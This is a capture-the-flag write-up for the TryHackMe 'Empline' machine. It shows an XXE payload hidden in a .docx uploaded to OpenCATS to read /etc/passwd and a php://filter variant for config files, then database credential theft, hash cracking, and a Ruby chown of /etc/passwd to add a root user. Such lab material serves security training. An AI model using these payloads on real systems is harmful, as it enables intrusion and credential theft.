# Empline TryHackMe Writeup
### Level: `Medium` | OS: `Linux`
![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.
![](2.png)

## Enumeration
We access website and review all zones of site.
![](3.png)

We list a subdomain that appears to lead to an employee area.
![](4.png)

We found deployed an Opencats with version 0.9.4.
![](5.png)

We launch "**dirsearch**", we list a directory where it shows us a panel that we can access without authentication.
![](26.png)

### Deficient control panel to authorization control
![](27.png)

## Exploitation
We search exploits and found this notice:
https://www.opencats.org/news/2019/july/

### Create with python docx_

```python
#!/usr/bin/env python
from docx import Document
document = Document()
paragraph = document.add_paragraph('m3n0sd0n4ld')
document.save('m3n0s.docx')
```
### Create m3n0s.docx
![](11.png)

Unzip the file and edit the "**document.xml**".
![](12.png)

```XML
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<!DOCTYPE payload [<!ENTITY payload SYSTEM "/etc/passwd"> ]>
```

We insert the following line (in orange color) and modify the text to "**&payload**".
![](13.png)

We see that the proof of concept works: .
![](14.png)

So now we read the "config.php" file where the database credentials are stored (remember that we have access to the service on port 3306).

```XML
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<!DOCTYPE payload [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&payload;</data>
```
We will get the content of the file in base64, so we decode and we will have the credentials in plain text.
![](17.png)

### Connect to the database
![](18.png)

We select the table "*users*" and we will obtain the encrypted password of the user "*george*" (this one has a system user ;))
![](19.png)

We use the "**hashes.com**" website to obtain the flat password through its hash.
![](25.png)

### Read user.txt flag
With the password in plain text, we connect through the **SSH** service and read the "*user.txt*" file.
![](20.png)

## Privilege Escalation
After an enumeration, "**linpeas.sh**" shows us that we have permissions with the "**ruby**" binary to modify the binary user due to a deficiency in capabilities.
![](21.png)

We create a ruby file that we will use to modify the user of the file so we can edit it with our user.
![](22.png)

```ruby
file = File.new("/etc/passwd", "r")
file.chown(1002, 1002)
```

Edit the file "*/etc/passwd*" and create the user "*m3n0sd0n4ld*", add the password hash and give it the root suid and save the file.
![](23.png)

We authenticate with the user "*m3n0sd0n4ld*", we see that we are root and we read the root.txt flag.

![](24.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
